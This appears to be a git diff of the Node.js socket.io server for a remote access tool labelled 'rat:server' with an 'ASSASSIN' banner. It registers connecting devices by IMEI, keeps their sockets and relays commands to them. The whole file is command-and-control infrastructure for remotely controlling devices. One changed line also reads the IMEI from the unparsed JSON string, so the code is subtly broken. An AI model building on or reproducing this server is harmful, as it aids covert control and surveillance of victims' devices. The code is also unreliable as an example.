@@ -4,10 +4,13 @@
  * Module dependencies.
  */
 
-var app = require('../app');
 var debug = require('debug')('rat:server');
-var http = require('http');
-var userList
+let figlet = require('figlet');
+
+figlet('- ASSASSIN -', (err, data) => {
+  console.log(data);
+})
+
 /**
  * Get port from environment and store in Express.
  */
@@ -25,8 +28,7 @@ const socketIO = require('socket.io')(server);
  * command to clients
  */
 const Cmd2Clients = require('../command/cmds/command2clients');
-const CmdFromClient = require('../command/cmds/commandFromClient');
-
+global.userList = [];
 global.userMap = new Map();
 global.sockets = new Map();
 
@@ -38,11 +40,7 @@ socketIO.on('connection', (socket) => {
   //listening the action when a client connect to the server
   socket.on(Cmd2Clients.SYSTEM_INFO, (data) => {
     saveUserInfo(socket, data);
-  })
-    .on('disconnected', (data) => {
-      console.log('a user disconnected');
-    });
-
+  });
   //monitor all cmd when clients post to the server
   global.cmder.forEach((value, key, map) => {
     let cmd = key.substring(5, key.length);
@@ -51,7 +49,7 @@ socketIO.on('connection', (socket) => {
     });
   });
   global.socket = socketIO;
-});
+})
 
 /**
  * Listen on provided port, on all network interfaces.
@@ -122,11 +120,8 @@ function onListening() {
 }
 function saveUserInfo(socket, data) {
   let userInfo = JSON.parse(data); //each clients userInfo
-  console.log('a user connect'
-    + '\n'
-    + data);
-  global.userMap.set(userInfo.IMEI, socket.id)  //save the IMEI to global to recorgnize the client
-  console.log("current user count :" + global.userMap.size); // record the count of all clients
+  console.log('a user connected info: \n' + data);
+  global.userMap.set(data.IMEI, data);
   global.sockets.set(userInfo.IMEI, socket);
 
 }
